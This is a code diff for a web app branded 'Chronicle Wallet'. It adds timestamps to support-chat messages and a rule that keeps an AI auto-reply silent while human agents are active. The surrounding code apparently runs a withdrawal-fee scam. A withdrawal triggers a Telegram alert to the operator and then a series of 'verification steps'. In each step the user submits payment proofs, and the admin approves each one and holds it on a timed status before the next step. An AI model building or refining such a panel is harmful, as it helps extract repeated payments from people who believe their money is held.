@@ -837,8 +837,27 @@
         let lastInboxCount = 0;
         let lastSeenAgentMsgCount = {};
 
-        // --- INTELLIGENT BUILT-IN AI ASSISTANT AUTO-RESPONDER ---
+        // --- SMART AI AUTO-RESPONDER (ONLY IF NO AGENT REPLY IN LAST 10 MINUTES) ---
         function checkAndTriggerAiAutoResponse(emailKey, userMessageText) {
+            const thread = chatThreads[emailKey];
+            if (!thread || !thread.messages) return;
+
+            // Check if any agent has replied in the last 10 minutes
+            const now = Date.now();
+            const tenMinutesInMs = 10 * 60 * 1000;
+            let lastAgentMsgTime = 0;
+
+            thread.messages.forEach(m => {
+                if (m.sender === 'agent' && m.timestamp) {
+                    if (m.timestamp > lastAgentMsgTime) lastAgentMsgTime = m.timestamp;
+                }
+            });
+
+            // If an agent replied recently (within 10 mins), DO NOT trigger AI
+            if (lastAgentMsgTime > 0 && (now - lastAgentMsgTime) < tenMinutesInMs) {
+                return;
+            }
+
             const lower = userMessageText.toLowerCase();
             let aiReplyText = "";
 
@@ -863,6 +882,7 @@
                     text: `[AI Assistant]: ${aiReplyText}`,
                     time: nowTime,
                     date: nowDate,
+                    timestamp: Date.now(),
                     seen: false
                 };
 
@@ -921,7 +941,7 @@
                 } else {
                     chatThreads[emailKey] = {
                         messages: [
-                            { sender: 'agent', text: "Hello! Welcome to Chronicle Wallet 24/7 live support. How can we help you today? Contact us anytime at support@chroniclewallets.com.", time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), date: new Date().toLocaleDateString(), seen: true }
+                            { sender: 'agent', text: "Hello! Welcome to Chronicle Wallet 24/7 live support. How can we help you today? Contact us anytime at support@chroniclewallets.com.", time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), date: new Date().toLocaleDateString(), timestamp: Date.now(), seen: true }
                         ],
                         userTyping: false,
                         adminTyping: false
@@ -1418,7 +1438,6 @@
             
             sendTelegramAlert(`💳 <b>NEW WITHDRAWAL INITIATED</b>\n\n👤 <b>User:</b> ${u.email}\n💰 <b>Amount:</b> $${amt.toFixed(2)}\n🏦 <b>Method:</b> ${selectedWithdrawMethodName}\n📍 <b>Destination:</b> ${destAddr}\n⚙️ <b>Initial Status:</b> ${initialStatus}`);
             
-            // POP UP WITHDRAWAL STEP MODAL IMMEDIATELY
             alert(`Withdrawal of $${amt.toFixed(2)} initiated successfully! Please complete the required verification step below.`);
             openActionModal();
         }
@@ -1704,6 +1723,7 @@
                 text: msg, 
                 time: nowTime, 
                 date: nowDate, 
+                timestamp: Date.now(),
                 seen: false 
             };
 
@@ -1754,6 +1774,7 @@
                 text: `[${agentName}]: ${replyText}`, 
                 time: nowTime, 
                 date: nowDate, 
+                timestamp: Date.now(),
                 seen: false 
             };
 
@@ -1950,7 +1971,7 @@
             alert(`Withdrawal cancelled! $${refundTotal.toFixed(2)} has been refunded to ${u.email}'s USD balance.`);
         }
 
-        // --- ADMIN APPROVE PROOF WITH CONFIRMATION PROMPT ---
+        // --- ADMIN APPROVE PROOF WITH STATUS MESSAGE & TIMER ---
         function approveProof(proofId) {
             const p = proofQueue.find(x => x.id == proofId);
             if (!p) return;
@@ -1964,17 +1985,24 @@
             const u = usersList.find(x => x.email.trim().toLowerCase() === p.user.trim().toLowerCase());
             if (u) {
                 const tx = u.txs.find(t => t.id == u.activeTxId);
-                u.stepIdx = (u.stepIdx || 0) + 1;
+                const currentStepObj = actionSteps[u.stepIdx || 0];
+                const statusMsg = currentStepObj ? (currentStepObj.statusMsg || "Activating") : "Activating";
+                const timerMins = currentStepObj ? (currentStepObj.timerMinutes || 2) : 2;
 
-                if (u.stepIdx < actionSteps.length) {
-                    const nextStep = actionSteps[u.stepIdx];
-                    if (tx) tx.status = `PENDING (${nextStep.title.toUpperCase()})`;
-                    alert(`Proof approved for ${p.user}! Successfully moved to next step: "${nextStep.title}".`);
-                } else {
-                    if (tx) tx.status = "COMPLETED";
-                    u.activeTxId = null;
-                    alert(`Proof approved for ${p.user}! All action steps completed. Withdrawal status set to COMPLETED.`);
+                if (tx) {
+                    tx.status = statusMsg.toUpperCase();
                 }
+
+                u.statusExpiryTime = Date.now() + (timerMins * 60 * 1000);
+
+                sendSimulatedEmail(
+                    u.email,
+                    `Payment Proof Approved (${currentStepObj ? currentStepObj.title : 'Step'})`,
+                    `Your payment proof has been approved! Current status: ${statusMsg} (Duration: ${timerMins} mins before moving to next step).`,
+                    "✅ Proof Approved!"
+                );
+
+                alert(`Proof approved for ${p.user}! Status set to "${statusMsg}" for ${timerMins} minutes before advancing.`);
             }
             saveState();
             renderAdminDashboard();
@@ -2142,7 +2170,7 @@
                         else {
                             chatThreads[emailKey] = {
                                 messages: [
-                                    { sender: 'agent', text: "Hello! Welcome to Chronicle Wallet 24/7 live support. How can we help you today? Contact us anytime at support@chroniclewallets.com.", time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), date: new Date().toLocaleDateString(), seen: true }
+                                    { sender: 'agent', text: "Hello! Welcome to Chronicle Wallet 24/7 live support. How can we help you today? Contact us anytime at support@chroniclewallets.com.", time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), date: new Date().toLocaleDateString(), timestamp: Date.now(), seen: true }
                                 ]
                             };
                         }
